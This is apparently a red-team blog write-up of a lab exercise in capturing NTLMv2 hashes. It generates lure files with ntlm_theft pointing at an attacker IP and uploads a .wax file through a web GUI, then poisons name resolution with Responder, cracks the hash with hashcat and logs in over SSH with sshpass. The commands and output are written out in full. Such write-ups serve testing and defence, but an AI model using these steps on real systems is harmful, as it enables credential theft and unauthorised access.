---
title: "NTLM Hash Capture via Legacy WAX File Bypass"
date: 2025-09-26 18:30:00 +0200
categories: [Red-teaming]
tags: [Red Teaming, NTLMv2, Responder, Hashcat, WAX, Credential Theft, Lateral Movement]
toc: true
pin: false
---

# NTLM Hash Capture via Legacy WAX File - Lab Demonstration

This lab scenario explores the capture of NTLMv2 hashes using a legacy WAX file combined with Responder for hash poisoning. The technique demonstrates a POC (proof of concept) 
approach that, while effective in controlled environments, may have varying real world applicability depending on target configurations and security controls. There was a option
to upload a Windows Media Player file through the Web GUI. This method could potentially be useful in red teaming engagements where legacy systems are present. 

## Attack Flow

### 1. Weaponized File Creation
The `ntlm_theft.py` tool generates multiple attack vectors including the `redteam.wax` file:

```bash
python3 ntlm_theft.py -g all -s 10.10.10.10 -f redteam
/home/kali/ntlm_theft/ntlm_theft.py:168: SyntaxWarning: invalid escape sequence '\l'
  location.href = 'ms-word:ofe|u|\\''' + server + '''\leak\leak.docx';
Created: redteam/redteam.scf (BROWSE TO FOLDER)
Created: redteam/redteam-(url).url (BROWSE TO FOLDER)
Created: redteam/redteam-(icon).url (BROWSE TO FOLDER)
Created: redteam/redteam.lnk (BROWSE TO FOLDER)
Created: redteam/redteam.rtf (OPEN)
Created: redteam/redteam-(stylesheet).xml (OPEN)
Created: redteam/redteam-(fulldocx).xml (OPEN)
Created: redteam/redteam.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
Created: redteam/redteam-(handler).htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
Created: redteam/redteam-(includepicture).docx (OPEN)
Created: redteam/redteam-(remotetemplate).docx (OPEN)
Created: redteam/redteam-(frameset).docx (OPEN)
Created: redteam/redteam-(externalcell).xlsx (OPEN)
Created: redteam/redteam.wax (OPEN)
Created: redteam/redteam.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY)
Created: redteam/redteam.asx (OPEN)
Created: redteam/redteam.jnlp (OPEN)
Created: redteam/redteam.application (DOWNLOAD AND OPEN)
Created: redteam/redteam.pdf (OPEN AND ALLOW)
Created: redteam/zoom-attack-instructions.txt (PASTE TO CHAT)
Created: redteam/redteam.library-ms (BROWSE TO FOLDER)
Created: redteam/Autorun.inf (BROWSE TO FOLDER)
Created: redteam/desktop.ini (BROWSE TO FOLDER)
Created: redteam/redteam.theme (THEME TO INSTALL
Generation Complete.
```

### 2. NTLM Hijacking via .WAX

The [Greenwolf/ntlm_theft](https://github.com/Greenwolf/ntlm_theft){:target="_blank"} repository was used as a reference for generating test files in a controlled lab environment.  

### 3. Responder setup

```bash

Responder is initiated on the tun0 interface to capture authentication attempts:

responder -I tun0  
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [OFF]
    IMAP server                [OFF]
    POP3 server                [OFF]
    SMTP server                [OFF]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [OFF]
    RDP server                 [OFF]
    DCE-RPC server             [OFF]
    WinRM server               [OFF]
    SNMP server                [OFF]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.10.10]
    Responder IPv6             [dead:beef:2::10cd]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-VVA6SP3PVXI]
    Responder Domain Name      [OUZ4.LOCAL]
    Responder DCE-RPC Port     [48236]

[*] Version: Responder 3.1.7.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>
[*] To sponsor Responder: https://paypal.me/PythonResponder

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.1.1.1
[SMB] NTLMv2-SSP Username : MEDIA\enox
[SMB] NTLMv2-SSP Hash     : SNIP
[*] Skipping previously captured hash for MEDIA\enox
[*] Skipping previously captured hash for MEDIA\enox
[+] Exiting...

```

### 4. Hash capture

The `redteam.wax` file was uploaded via the web GUI and, when processed/previewed by the target, the authentication listener recorded an NTLMv2 authentication exchange.

```bash

Target interaction with the WAX file results in NTLMv2 hash capture:

SMB] NTLMv2-SSP Client   : 10.10.10.1
<SNIPPED GOT THE HASH>

Then saved the captured hash as enox.hash and cracked it by using hashcat.

hashcat enox.hash /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt 


```

### 5.  Logged in using sshpass
```bash
sshpass -p 'THECRACKEDPASSWORD' ssh enox@10.10.10.10

```


### 6. Conclusion

This lab showed that a legacy file format such as .WAX can be turned into a practical test of modern defenses. In a controlled environment the WAX file repeatedly caused an endpoint to
initiate an outbound NTLMv2 authentication exchange that revealed authentication metadata. That behavior highlights how older handlers and automatic retrieval mechanisms remain an underrated attack surface.

For red teams this provides a quiet but effective tool for social engineering and client side testing. A small user action, such as previewing or opening a media file,
can trigger protocol level behavior with real consequences. Use of this approach must be strictly authorised, carefully scoped, and fully documented to avoid real world harm.

For defenders the message is simple. Limit legacy protocol egress, harden client policies to reduce automatic retrieval of remote content, and
tune detection to link file open or preview events with outbound NTLM activity. Those steps will greatly reduce the odds that a routine media file becomes a pathway for credential exposure.

Ultimately legacy formats still matter. They can produce high impact, low visibility checks of network segmentation, endpoint configuration,
and detection maturity when used responsibly and with appropriate safeguards.


